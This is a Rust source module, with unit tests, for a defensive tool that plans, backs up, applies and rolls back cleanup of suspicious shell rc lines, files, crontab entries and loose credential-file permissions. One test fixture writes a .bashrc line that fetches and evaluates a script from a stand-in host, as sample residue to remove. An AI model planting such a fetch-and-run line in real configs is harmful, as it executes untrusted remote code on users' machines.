//! Plan, apply, and roll back residue fixes.
//!
//! The plan is a document: every action names its target, the target's
//! SHA-256 and mode at planning time, and the rule that asked for it. Apply
//! refuses an action whose target changed since the plan was made, backs the
//! target up under `~/.sigil/backups/<id>/` *before* mutating it, and writes
//! a manifest as it goes. Rollback walks the manifest in reverse and restores
//! only what still matches what apply left behind — `--force` overrides that
//! one check and nothing else.
//!
//! What is never planned is enforced by construction: the checks only attach
//! an action to user-owned files inside `$HOME` or the scanned repository,
//! credential files are only ever `chmod`-ed, and system paths, symlinks and
//! settings directories carry no action at all.

use std::collections::HashMap;
use std::fs;
use std::io::IsTerminal;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use super::checks::run_with_timeout;
use super::{Action, Context, Level, Report};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PlannedAction {
    pub n: usize,
    pub rule: String,
    pub severity: Level,
    pub title: String,
    pub action: Action,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sha256_before: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mode_before: Option<u32>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Plan {
    pub kind: String,
    pub plan_schema: u32,
    pub created: String,
    pub source_items: usize,
    pub actions: Vec<PlannedAction>,
}

/// Build a plan from a report: every fixable item at Medium or above.
pub fn build(report: &Report) -> Plan {
    let mut actions = Vec::new();
    for item in report
        .items
        .iter()
        .filter(|i| i.fixable && i.severity >= Level::Medium)
    {
        let Some(action) = &item.action else { continue };
        let target = action_path(action);
        let (sha256_before, mode_before) = match &target {
            Some(p) if Path::new(p).is_file() => (
                sha256_file(Path::new(p)),
                super::checks::file_mode(Path::new(p)),
            ),
            _ => (None, None),
        };
        actions.push(PlannedAction {
            n: actions.len() + 1,
            rule: item.id.clone(),
            severity: item.severity,
            title: item.title.clone(),
            action: action.clone(),
            sha256_before,
            mode_before,
        });
    }
    Plan {
        kind: "residue-plan".to_string(),
        plan_schema: 1,
        created: chrono::Utc::now().to_rfc3339(),
        source_items: report.items.len(),
        actions,
    }
}

/// Human rendering of a plan.
pub fn render_plan(plan: &Plan) -> String {
    use colored::Colorize;
    let mut out = String::new();
    if plan.actions.is_empty() {
        out.push_str("\n  No reversible fixes to plan.\n");
        return out;
    }
    out.push_str(&format!(
        "\n  {} residue plan — {} action(s)\n",
        "sigil".bold().cyan(),
        plan.actions.len()
    ));
    for a in &plan.actions {
        let what = match &a.action {
            Action::RemoveLine {
                path,
                line,
                content,
            } => format!(
                "remove line {line} from {path}\n         {}",
                super::redact(content).dimmed()
            ),
            Action::Chmod { path, mode } => format!("chmod {mode:o} {path}"),
            Action::RemoveFile { path } => format!("delete file {path}"),
            Action::RemoveDir { path } => format!("delete directory {path}"),
            Action::RemoveCrontabLine { content } => format!(
                "remove crontab entry\n         {}",
                super::redact(content).dimmed()
            ),
        };
        out.push_str(&format!(
            "  [{}] {} ({}) — {}\n      {}\n",
            a.n,
            a.title,
            a.rule,
            a.severity.as_str(),
            what
        ));
    }
    out.push_str("\n  Every action is backed up before it runs; undo with `sigil residue rollback <id>`.\n  Run `sigil residue apply` to execute (interactive), or `sigil residue apply --yes`.\n");
    out
}

fn action_path(action: &Action) -> Option<String> {
    match action {
        Action::RemoveLine { path, .. }
        | Action::Chmod { path, .. }
        | Action::RemoveFile { path }
        | Action::RemoveDir { path } => Some(path.clone()),
        Action::RemoveCrontabLine { .. } => None,
    }
}

pub fn sha256_file(path: &Path) -> Option<String> {
    let bytes = fs::read(path).ok()?;
    Some(format!("{:x}", Sha256::digest(&bytes)))
}

// ---------------------------------------------------------------------------
// Backups
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ManifestEntry {
    pub n: usize,
    pub action: Action,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub backup: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sha256_before: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sha256_after: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mode_before: Option<u32>,
    /// `done`, `skipped: <reason>`, `failed: <reason>`.
    pub status: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Manifest {
    pub schema: u32,
    pub id: String,
    pub created: String,
    pub sigil_version: String,
    pub entries: Vec<ManifestEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApplyReport {
    pub kind: String,
    pub backup_id: String,
    pub backup_dir: String,
    pub applied: usize,
    pub skipped: Vec<String>,
    pub failed: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RollbackReport {
    pub kind: String,
    pub backup_id: String,
    pub restored: usize,
    pub skipped: Vec<String>,
}

pub fn backups_dir(ctx: &Context) -> PathBuf {
    ctx.sigil_dir.join("backups")
}

fn new_backup_id() -> String {
    let stamp = chrono::Utc::now().format("%Y%m%dT%H%M%SZ");
    let suffix: String = uuid::Uuid::new_v4()
        .simple()
        .to_string()
        .chars()
        .take(6)
        .collect();
    format!("{stamp}-{suffix}")
}

/// Ask per action on a terminal. Returns `Err` with a reason when apply must
/// refuse (no terminal and no `--yes`).
pub fn apply(ctx: &Context, plan: &Plan, yes: bool) -> Result<ApplyReport, String> {
    if plan.actions.is_empty() {
        return Ok(ApplyReport {
            kind: "residue-apply".into(),
            backup_id: String::new(),
            backup_dir: String::new(),
            applied: 0,
            skipped: vec![],
            failed: vec![],
        });
    }
    let interactive = !yes;
    if interactive && !std::io::stdin().is_terminal() {
        return Err(
            "refusing to apply without a terminal; pass --yes to run non-interactively".to_string(),
        );
    }
    let id = new_backup_id();
    let dir = backups_dir(ctx).join(&id);
    fs::create_dir_all(&dir).map_err(|e| format!("cannot create {}: {e}", dir.display()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&dir, fs::Permissions::from_mode(0o700));
    }
    let mut manifest = Manifest {
        schema: 1,
        id: id.clone(),
        created: chrono::Utc::now().to_rfc3339(),
        sigil_version: env!("CARGO_PKG_VERSION").to_string(),
        entries: Vec::new(),
    };
    let mut report = ApplyReport {
        kind: "residue-apply".into(),
        backup_id: id.clone(),
        backup_dir: dir.to_string_lossy().to_string(),
        applied: 0,
        skipped: vec![],
        failed: vec![],
    };

    // Files this run has already changed: the hash apply left behind and the
    // original line numbers removed so far, so a second removal in the same
    // file checks against the current text and the right index.
    let mut touched: HashMap<String, FileState> = HashMap::new();

    for planned in &plan.actions {
        if interactive {
            use std::io::Write;
            print!("  [{}] {} — apply? [y/N/q] ", planned.n, planned.title);
            let _ = std::io::stdout().flush();
            let mut answer = String::new();
            let _ = std::io::stdin().read_line(&mut answer);
            match answer.trim().to_ascii_lowercase().as_str() {
                "y" | "yes" => {}
                "q" | "quit" => break,
                _ => {
                    report.skipped.push(format!("{}: declined", planned.n));
                    continue;
                }
            }
        }
        let mut entry = ManifestEntry {
            n: planned.n,
            action: planned.action.clone(),
            backup: None,
            sha256_before: planned.sha256_before.clone(),
            sha256_after: None,
            mode_before: planned.mode_before,
            status: "pending".into(),
        };
        match apply_one(ctx, planned, &dir, &mut entry, &mut touched) {
            Ok(()) => {
                entry.status = "done".into();
                report.applied += 1;
            }
            Err(reason) => {
                let skipped = reason.starts_with("skipped");
                entry.status = reason.clone();
                if skipped {
                    report.skipped.push(format!("{}: {reason}", planned.n));
                } else {
                    report.failed.push(format!("{}: {reason}", planned.n));
                }
            }
        }
        manifest.entries.push(entry);
        write_manifest(&dir, &manifest)?;
    }
    write_manifest(&dir, &manifest)?;
    Ok(report)
}

fn write_manifest(dir: &Path, manifest: &Manifest) -> Result<(), String> {
    let text = serde_json::to_string_pretty(manifest).map_err(|e| e.to_string())?;
    fs::write(dir.join("manifest.json"), text).map_err(|e| format!("cannot write manifest: {e}"))
}

fn guard_target(ctx: &Context, path: &Path) -> Result<(), String> {
    let allowed = ctx.in_home(path) || ctx.repo.as_ref().is_some_and(|r| path.starts_with(r));
    if !allowed {
        return Err("skipped: outside the home directory and the scanned repository".into());
    }
    if fs::symlink_metadata(path).is_ok_and(|m| m.file_type().is_symlink()) {
        return Err("skipped: target is a symlink".into());
    }
    if path.starts_with(&ctx.sigil_dir) {
        return Err("skipped: Sigil's own directory is never modified".into());
    }
    Ok(())
}

fn copy_file_preserving(src: &Path, dst: &Path) -> Result<(), String> {
    fs::copy(src, dst).map_err(|e| format!("failed: backup copy {e}"))?;
    if let Some(mode) = super::checks::file_mode(src) {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = fs::set_permissions(dst, fs::Permissions::from_mode(mode));
        }
    }
    Ok(())
}

fn copy_dir_recursive(src: &Path, dst: &Path) -> Result<(), String> {
    fs::create_dir_all(dst).map_err(|e| format!("failed: {e}"))?;
    for entry in fs::read_dir(src)
        .map_err(|e| format!("failed: {e}"))?
        .flatten()
    {
        let meta = entry.metadata().map_err(|e| format!("failed: {e}"))?;
        let target = dst.join(entry.file_name());
        if meta.file_type().is_symlink() {
            continue;
        } else if meta.is_dir() {
            copy_dir_recursive(&entry.path(), &target)?;
        } else {
            copy_file_preserving(&entry.path(), &target)?;
        }
    }
    Ok(())
}

fn backup_name(dir: &Path, n: usize, path: &Path) -> PathBuf {
    let base = path
        .file_name()
        .map(|f| f.to_string_lossy().to_string())
        .unwrap_or_else(|| "item".into());
    dir.join(format!("{n}-{base}"))
}

/// What this apply run has already done to one file.
#[derive(Default)]
struct FileState {
    /// Hash after the last action that touched the file.
    sha256: Option<String>,
    /// Original (plan-time) line numbers removed so far.
    removed_lines: Vec<usize>,
}

fn apply_one(
    ctx: &Context,
    planned: &PlannedAction,
    dir: &Path,
    entry: &mut ManifestEntry,
    touched: &mut HashMap<String, FileState>,
) -> Result<(), String> {
    match &planned.action {
        Action::RemoveLine {
            path,
            line,
            content,
        } => {
            let p = Path::new(path);
            guard_target(ctx, p)?;
            let state = touched.get(path);
            let expected = state
                .and_then(|s| s.sha256.clone())
                .or_else(|| planned.sha256_before.clone());
            if sha256_file(p) != expected {
                return Err("skipped: file changed since the plan was made".into());
            }
            entry.sha256_before = expected;
            let text = fs::read_to_string(p).map_err(|e| format!("failed: {e}"))?;
            let lines: Vec<&str> = text.split_inclusive('\n').collect();
            // Earlier removals above this line in the same run shift it up.
            let shift = state
                .map(|s| s.removed_lines.iter().filter(|l| **l < *line).count())
                .unwrap_or(0);
            let idx = line.checked_sub(1 + shift).ok_or("failed: bad line")?;
            if lines.get(idx).map(|l| l.trim_end_matches('\n')) != Some(content.as_str()) {
                return Err("skipped: line content no longer matches".into());
            }
            let backup = backup_name(dir, planned.n, p);
            copy_file_preserving(p, &backup)?;
            entry.backup = Some(backup.to_string_lossy().to_string());
            let mut rest: Vec<&str> = lines;
            rest.remove(idx);
            let new_text: String = rest.concat();
            fs::write(p, new_text).map_err(|e| format!("failed: {e}"))?;
            entry.sha256_after = sha256_file(p);
            let st = touched.entry(path.clone()).or_default();
            st.sha256 = entry.sha256_after.clone();
            st.removed_lines.push(*line);
            Ok(())
        }
        Action::Chmod { path, mode } => {
            let p = Path::new(path);
            guard_target(ctx, p).or_else(|e| {
                if e.contains("Sigil's own") {
                    Ok(())
                } else {
                    Err(e)
                }
            })?;
            if !p.is_file() {
                return Err("skipped: not a regular file".into());
            }
            entry.mode_before = super::checks::file_mode(p);
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                fs::set_permissions(p, fs::Permissions::from_mode(*mode))
                    .map_err(|e| format!("failed: {e}"))?;
            }
            #[cfg(not(unix))]
            {
                let _ = mode;
                return Err("skipped: permission bits are not supported on this platform".into());
            }
            entry.sha256_after = sha256_file(p);
            Ok(())
        }
        Action::RemoveFile { path } => {
            let p = Path::new(path);
            guard_target(ctx, p)?;
            if !p.is_file() {
                return Err("skipped: not a regular file".into());
            }
            let expected = touched
                .get(path)
                .and_then(|s| s.sha256.clone())
                .or_else(|| planned.sha256_before.clone());
            if expected.is_some() && sha256_file(p) != expected {
                return Err("skipped: file changed since the plan was made".into());
            }
            let backup = backup_name(dir, planned.n, p);
            copy_file_preserving(p, &backup)?;
            entry.backup = Some(backup.to_string_lossy().to_string());
            fs::remove_file(p).map_err(|e| format!("failed: {e}"))?;
            Ok(())
        }
        Action::RemoveDir { path } => {
            let p = Path::new(path);
            guard_target(ctx, p)?;
            if !p.is_dir() {
                return Err("skipped: not a directory".into());
            }
            let backup = backup_name(dir, planned.n, p);
            copy_dir_recursive(p, &backup)?;
            entry.backup = Some(backup.to_string_lossy().to_string());
            fs::remove_dir_all(p).map_err(|e| format!("failed: {e}"))?;
            Ok(())
        }
        Action::RemoveCrontabLine { content } => {
            let current = run_with_timeout(&["crontab", "-l"], None, None)
                .ok_or("skipped: cannot read crontab")?;
            if !current.lines().any(|l| l == content) {
                return Err("skipped: crontab entry no longer present".into());
            }
            let backup = dir.join(format!("{}-crontab.bak", planned.n));
            fs::write(&backup, &current).map_err(|e| format!("failed: {e}"))?;
            entry.backup = Some(backup.to_string_lossy().to_string());
            let new_text: String = current
                .lines()
                .filter(|l| *l != content)
                .map(|l| format!("{l}\n"))
                .collect();
            run_with_timeout(&["crontab", "-"], None, Some(&new_text))
                .ok_or("failed: crontab - rejected the new table")?;
            Ok(())
        }
    }
}

/// Summaries of the backups on disk, newest first.
pub fn list_backups(ctx: &Context) -> Vec<(String, String, usize)> {
    let mut out = Vec::new();
    let Ok(entries) = fs::read_dir(backups_dir(ctx)) else {
        return out;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let Ok(text) = fs::read_to_string(path.join("manifest.json")) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<Manifest>(&text) else {
            continue;
        };
        out.push((
            m.id,
            m.created,
            m.entries.iter().filter(|e| e.status == "done").count(),
        ));
    }
    out.sort_by(|a, b| b.1.cmp(&a.1));
    out
}

/// Restore a backup. Without `force`, a target whose current hash is not
/// what apply left behind is skipped rather than overwritten.
pub fn rollback(ctx: &Context, id: &str, force: bool) -> Result<RollbackReport, String> {
    let dir = backups_dir(ctx).join(id);
    let text = fs::read_to_string(dir.join("manifest.json"))
        .map_err(|_| format!("no backup named {id} under {}", backups_dir(ctx).display()))?;
    let manifest: Manifest =
        serde_json::from_str(&text).map_err(|e| format!("manifest unreadable: {e}"))?;
    let mut report = RollbackReport {
        kind: "residue-rollback".into(),
        backup_id: id.to_string(),
        restored: 0,
        skipped: vec![],
    };
    for entry in manifest.entries.iter().rev().filter(|e| e.status == "done") {
        let result: Result<(), String> = match &entry.action {
            Action::RemoveLine { path, .. } | Action::RemoveFile { path } => {
                let p = Path::new(path);
                let Some(backup) = entry.backup.as_deref() else {
                    Err("no backup recorded".to_string())?
                };
                if p.exists()
                    && !force
                    && entry.sha256_after.is_some()
                    && sha256_file(p) != entry.sha256_after
                {
                    Err("target changed since apply; use --force to overwrite".to_string())
                } else {
                    if let Some(parent) = p.parent() {
                        let _ = fs::create_dir_all(parent);
                    }
                    copy_file_preserving(Path::new(backup), p)
                }
            }
            Action::RemoveDir { path } => {
                let p = Path::new(path);
                let Some(backup) = entry.backup.as_deref() else {
                    Err("no backup recorded".to_string())?
                };
                if p.exists() && !force {
                    Err("directory exists again; use --force to overwrite".to_string())
                } else {
                    if p.exists() {
                        let _ = fs::remove_dir_all(p);
                    }
                    copy_dir_recursive(Path::new(backup), p)
                }
            }
            Action::Chmod { path, .. } => {
                let p = Path::new(path);
                match entry.mode_before {
                    #[cfg(unix)]
                    Some(mode) => {
                        use std::os::unix::fs::PermissionsExt;
                        fs::set_permissions(p, fs::Permissions::from_mode(mode))
                            .map_err(|e| e.to_string())
                    }
                    _ => Err("no previous mode recorded".to_string()),
                }
            }
            Action::RemoveCrontabLine { .. } => {
                let Some(backup) = entry.backup.as_deref() else {
                    Err("no backup recorded".to_string())?
                };
                let table = fs::read_to_string(backup).map_err(|e| e.to_string())?;
                run_with_timeout(&["crontab", "-"], None, Some(&table))
                    .map(|_| ())
                    .ok_or("crontab - rejected the backup".to_string())
            }
        };
        match result {
            Ok(()) => report.restored += 1,
            Err(reason) => report.skipped.push(format!("{}: {reason}", entry.n)),
        }
    }
    Ok(report)
}

#[cfg(test)]
mod tests {
    use super::super::{Host, Item, Summary};
    use super::*;

    fn report_with(items: Vec<Item>) -> Report {
        Report {
            kind: "residue".into(),
            residue_schema: 1,
            host: Host {
                os: "t".into(),
                home: String::new(),
            },
            checks_run: vec![],
            checks_skipped: vec![],
            items,
            items_suppressed: vec![],
            summary: Summary::default(),
        }
    }

    fn item(id: &str, severity: Level, action: Action, path: &str) -> Item {
        Item {
            id: id.into(),
            severity,
            category: "shell_rc".into(),
            title: "t".into(),
            path: path.into(),
            line: None,
            evidence: String::new(),
            origin: "unknown".into(),
            fixable: true,
            action: Some(action),
            remediation: String::new(),
        }
    }

    #[test]
    fn plan_only_takes_fixable_medium_plus() {
        let r = report_with(vec![
            item(
                "A",
                Level::Critical,
                Action::RemoveFile { path: "/x".into() },
                "/x",
            ),
            item(
                "B",
                Level::Low,
                Action::RemoveFile { path: "/y".into() },
                "/y",
            ),
            Item {
                fixable: false,
                ..item(
                    "C",
                    Level::High,
                    Action::RemoveFile { path: "/z".into() },
                    "/z",
                )
            },
        ]);
        let plan = build(&r);
        assert_eq!(plan.actions.len(), 1);
        assert_eq!(plan.actions[0].rule, "A");
        assert_eq!(plan.kind, "residue-plan");
    }

    #[test]
    fn remove_line_round_trips_through_backup_and_rollback() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = Context::rooted(dir.path());
        let rc = dir.path().join(".bashrc");
        let original = "export A=1\neval \"$(curl -s http://x.example/e.sh)\"\nexport B=2\n";
        fs::write(&rc, original).unwrap();
        let r = report_with(vec![item(
            "RES-SHELL-001",
            Level::Critical,
            Action::RemoveLine {
                path: rc.to_string_lossy().into(),
                line: 2,
                content: "eval \"$(curl -s http://x.example/e.sh)\"".into(),
            },
            &rc.to_string_lossy(),
        )]);
        let plan = build(&r);
        assert!(plan.actions[0].sha256_before.is_some());
        let applied = apply(&ctx, &plan, true).unwrap();
        assert_eq!(applied.applied, 1, "{applied:?}");
        assert_eq!(fs::read_to_string(&rc).unwrap(), "export A=1\nexport B=2\n");
        let backups = list_backups(&ctx);
        assert_eq!(backups.len(), 1);
        let rb = rollback(&ctx, &applied.backup_id, false).unwrap();
        assert_eq!(rb.restored, 1, "{rb:?}");
        assert_eq!(fs::read_to_string(&rc).unwrap(), original);
    }

    #[test]
    fn several_removals_in_one_file_chain_and_roll_back() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = Context::rooted(dir.path());
        let rc = dir.path().join(".bashrc");
        let original = "keep 1\nbad 2\nbad 3\nworst 4\nkeep 5\n";
        fs::write(&rc, original).unwrap();
        let path: String = rc.to_string_lossy().into();
        let remove = |line: usize, content: &str| Action::RemoveLine {
            path: path.clone(),
            line,
            content: content.into(),
        };
        // Plan order is by severity, so line 4 goes first, then 2, then 3:
        // the later removals must be judged against the file as it now is.
        let r = report_with(vec![
            item("A", Level::Critical, remove(4, "worst 4"), &path),
            item("B", Level::High, remove(2, "bad 2"), &path),
            item("C", Level::High, remove(3, "bad 3"), &path),
        ]);
        let plan = build(&r);
        assert_eq!(plan.actions.len(), 3);
        let applied = apply(&ctx, &plan, true).unwrap();
        assert_eq!(applied.applied, 3, "{applied:?}");
        assert_eq!(fs::read_to_string(&rc).unwrap(), "keep 1\nkeep 5\n");
        let rb = rollback(&ctx, &applied.backup_id, false).unwrap();
        assert_eq!(rb.restored, 3, "{rb:?}");
        assert_eq!(fs::read_to_string(&rc).unwrap(), original);
    }

    #[test]
    fn apply_skips_when_the_file_changed_since_planning() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = Context::rooted(dir.path());
        let rc = dir.path().join(".zshrc");
        fs::write(&rc, "bad line\n").unwrap();
        let r = report_with(vec![item(
            "X",
            Level::High,
            Action::RemoveLine {
                path: rc.to_string_lossy().into(),
                line: 1,
                content: "bad line".into(),
            },
            &rc.to_string_lossy(),
        )]);
        let plan = build(&r);
        fs::write(&rc, "bad line\nnew line\n").unwrap();
        let applied = apply(&ctx, &plan, true).unwrap();
        assert_eq!(applied.applied, 0);
        assert_eq!(applied.skipped.len(), 1, "{applied:?}");
        assert_eq!(fs::read_to_string(&rc).unwrap(), "bad line\nnew line\n");
    }

    #[test]
    fn targets_outside_home_and_sigil_dir_are_refused() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = Context::rooted(dir.path());
        let outside = tempfile::tempdir().unwrap();
        let f = outside.path().join("hook");
        fs::write(&f, "x").unwrap();
        let r = report_with(vec![item(
            "X",
            Level::High,
            Action::RemoveFile {
                path: f.to_string_lossy().into(),
            },
            &f.to_string_lossy(),
        )]);
        let applied = apply(&ctx, &build(&r), true).unwrap();
        assert_eq!(applied.applied, 0);
        assert!(f.exists());
        assert!(applied.skipped[0].contains("outside"), "{applied:?}");
    }

    #[cfg(unix)]
    #[test]
    fn chmod_round_trip() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let ctx = Context::rooted(dir.path());
        let cred = dir.path().join(".netrc");
        fs::write(&cred, "machine x login y password z\n").unwrap();
        fs::set_permissions(&cred, fs::Permissions::from_mode(0o644)).unwrap();
        let r = report_with(vec![item(
            "RES-CRED-002",
            Level::Medium,
            Action::Chmod {
                path: cred.to_string_lossy().into(),
                mode: 0o600,
            },
            &cred.to_string_lossy(),
        )]);
        let applied = apply(&ctx, &build(&r), true).unwrap();
        assert_eq!(applied.applied, 1);
        assert_eq!(
            fs::metadata(&cred).unwrap().permissions().mode() & 0o777,
            0o600
        );
        rollback(&ctx, &applied.backup_id, false).unwrap();
        assert_eq!(
            fs::metadata(&cred).unwrap().permissions().mode() & 0o777,
            0o644
        );
    }
}
